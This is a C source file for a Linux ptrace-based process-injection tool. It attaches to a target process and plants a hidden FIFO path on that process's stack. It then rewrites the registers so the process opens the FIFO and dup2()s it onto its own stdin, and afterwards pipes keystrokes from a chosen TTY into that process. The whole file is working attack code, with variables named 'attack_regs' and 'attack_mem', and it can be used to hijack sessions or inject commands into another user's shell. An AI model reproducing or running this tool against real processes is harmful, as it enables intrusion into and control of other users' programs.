#include <errno.h>
#include <error.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#define BUFFER_SIZE 32

long ptrace_do(enum __ptrace_request request, pid_t pid, void *addr, void *data);
void waitpid_do(pid_t pid, char *program_name);
void print_urs(struct user_regs_struct *urs);

int main(int argc, char **argv){

	int i;
	pid_t target, me;
	int tty_fd, fifo_fd;
	char echo;

	struct user_regs_struct saved_regs, attack_regs;
	char scratch[BUFFER_SIZE];
	
	union word{
		long long_word;
		char char_word[sizeof(long)];
	};

	union word ptrace_data;

	struct chunk_o_mem {
		//	start address where we got the memory (word aligned)
		unsigned long address;

		//	number of words
		int count;

		//	memory associated with that chunk
		char contents[BUFFER_SIZE];
	};

	struct chunk_o_mem saved_mem, attack_mem;


	if(argc != 3){
		fprintf(stderr, "usage: %s PID TTY\n", argv[0]);
		exit(-1);
	}

	/* grab pids */
	errno = 0;
	target = (pid_t) strtol(argv[1], NULL, 10);
	if(errno){
		error(-1, errno, "strtol()");
	}

	me = getpid();

	/* setup the fifo */
	memset(scratch, 0, sizeof(scratch));
	if(snprintf(scratch, sizeof(scratch), "/tmp/.%d_%d", me, target) < 0){
		error(-1, errno, "snprintf()");
	}

	if(mkfifo(scratch, S_IRUSR|S_IWUSR)){
		error(-1, errno, "mkfifo()");
	}

	if((tty_fd = open(argv[2], O_RDONLY)) < 0){
		error(-1, errno, "open()");
	}

	/* attach to the target process */
	ptrace_do(PTRACE_ATTACH, target, NULL, NULL);
	waitpid_do(target, argv[0]);

	/* grab target processes registers and memory for restoration later. */
	memset(&saved_regs, 0, sizeof(saved_regs));
	ptrace_do(PTRACE_GETREGS, target, NULL, &saved_regs);

	//	printf("print_urs(&saved_regs)\n");
	//	print_urs(&saved_regs);

	/* save memory for later restoration */
	memset(&saved_mem, 0, sizeof(saved_mem));
	saved_mem.count = (strlen(scratch) + 1) / sizeof(long);
	if((strlen(scratch) + 1) % sizeof(long)) saved_mem.count++;

	saved_mem.address = (saved_regs.rsp & ~(sizeof(long) - 1)) + sizeof(long);
	//printf("DEBUG: saved_regs.rsp: %lx\n", saved_regs.rsp);
	//printf("DEBUG: saved_mem.address: %lx\n", saved_mem.address);

	for(i = 0; i < saved_mem.count; i++){
		ptrace_data.long_word = ptrace_do(PTRACE_PEEKTEXT, target, (void *) (saved_mem.address + (i * sizeof(long))), NULL);
		memcpy(&(saved_mem.contents[i * sizeof(long)]), ptrace_data.char_word, sizeof(long));
	}

	memset(&ptrace_data, 0, sizeof(ptrace_data));
	memcpy(&attack_mem, &saved_mem, sizeof(attack_mem));
	memcpy(attack_mem.contents, &scratch, BUFFER_SIZE);
	for(i = 0; i < attack_mem.count; i++){
		memcpy(ptrace_data.char_word, &(attack_mem.contents[i * sizeof(long)]), sizeof(long));
		ptrace_do(PTRACE_POKETEXT, target, (void *) (saved_mem.address + (i * sizeof(long))), (void *) ptrace_data.long_word);
	}

	/* setup the attack registers and memory. */
	memcpy(&attack_regs, &saved_regs, sizeof(attack_regs));
	attack_regs.rax = __NR_open;
	attack_regs.rdi = attack_mem.address;
	attack_regs.rsi = O_RDONLY;
	attack_regs.rip = saved_regs.rip - 2;

	//	printf("print_urs(&attack_regs)\n");
	//	print_urs(&attack_regs);

	ptrace_do(PTRACE_SETREGS, target, NULL, &attack_regs);

	ptrace_do(PTRACE_SINGLESTEP, target, NULL, NULL);
	if((fifo_fd = open(scratch, O_WRONLY)) < 0){
		error(-1, errno, "open()");
	}
	waitpid_do(target, argv[0]);

  memset(&attack_regs, 0, sizeof(saved_regs));
  ptrace_do(PTRACE_GETREGS, target, NULL, &attack_regs);

	printf("print_urs(&attack_regs)\n");
	print_urs(&attack_regs);

	attack_regs.rdi = attack_regs.rax;
	attack_regs.rax = __NR_dup2;
	attack_regs.rsi = 0;
	attack_regs.rip = saved_regs.rip - 2;

	printf("print_urs(&attack_regs)\n");
	print_urs(&attack_regs);

	ptrace_do(PTRACE_SETREGS, target, NULL, &attack_regs);

	ptrace_do(PTRACE_SINGLESTEP, target, NULL, NULL);
	waitpid_do(target, argv[0]);

	/* restore original regs and memory, then detach. */
	for(i = 0; i < saved_mem.count; i++){
		memcpy(ptrace_data.char_word, &(saved_mem.contents[i * sizeof(long)]), sizeof(long));
		ptrace_do(PTRACE_POKETEXT, target, (void *) (saved_mem.address + (i * sizeof(long))), (void *) ptrace_data.long_word);
	}

	ptrace_do(PTRACE_SETREGS, target, NULL, &saved_regs);
	ptrace_do(PTRACE_DETACH, target, NULL, NULL);

	echo = '\0';
	while(read(tty_fd, &echo, 1)){
		write(fifo_fd, &echo, 1);
		write(1, &echo, 1);
		if(echo == '\r'){
			echo = '\n';
			write(1, &echo, 1);
		}
		echo = '\0';
	}

	return(0);
}

long ptrace_do(enum __ptrace_request request, pid_t pid, void *addr, void *data){
	long return_val = 0;
	printf("ptrace(%d, %d, %lx, %lx)\n", (int) request, (int) pid, (long unsigned int) addr, (long unsigned int) data);

	// XXX DEBUG
	if(data){
		//printf("DEBUG: *data: %lx\n", (unsigned long) *(char *) data);
		printf("DEBUG: data: %lx\n", (unsigned long) data);
	}

	errno = 0;
	return_val = ptrace(request, pid, addr, data);
	if(errno){
		error(-1, errno, "ptrace(%d, %d, %lx, %lx)\n", (int) request, (int) pid, (long unsigned int) addr, (long unsigned int) data);
	}

	return(return_val);
}

void waitpid_do(pid_t pid, char *program_name){
	int status;
	pid_t return_pid;

	errno = 0;
	if((return_pid = waitpid(pid, &status, 0)) < 1){
		error(-1, errno, "waitpid()");
	}

	if(!WIFSTOPPED(status)){
		fprintf(stderr, "%s: waitpid(): !WIFSTOPPED(status)\n", program_name);
		exit(-1);
	}
}

void print_urs(struct user_regs_struct *urs){
	printf("&urs:%lx\n", (long int) &urs);
	printf("	r15:%lx\n", urs->r15);
	printf("	r14:%lx\n", urs->r14);
	printf("	r13:%lx\n", urs->r13);
	printf("	r12:%lx\n", urs->r12);
	printf("	rbp:%lx\n", urs->rbp);
	printf("	rbx:%lx\n", urs->rbx);
	printf("	r11:%lx\n", urs->r11);
	printf("	r10:%lx\n", urs->r10);
	printf("	r9:%lx\n", urs->r9);
	printf("	r8:%lx\n", urs->r8);
	printf("	rax:%lx\n", urs->rax);
	printf("	rcx:%lx\n", urs->rcx);
	printf("	rdx:%lx\n", urs->rdx);
	printf("	rsi:%lx\n", urs->rsi);
	printf("	rdi:%lx\n", urs->rdi);
	printf("	orig_rax:%lx\n", urs->orig_rax);
	printf("	rip:%lx\n", urs->rip);
	printf("	rcs:%lx\n", urs->cs);
	printf("	eflags:%lx\n", urs->eflags);
	printf("	rsp:%lx\n", urs->rsp);
	printf("	ss:%lx\n", urs->ss);
	printf("	fs_base:%lx\n", urs->fs_base);
	printf("	gs_base:%lx\n", urs->gs_base);
	printf("	ds:%lx\n", urs->ds);
	printf("	es:%lx\n", urs->es);
	printf("	fs:%lx\n", urs->fs);
	printf("	gs:%lx\n", urs->gs);
}
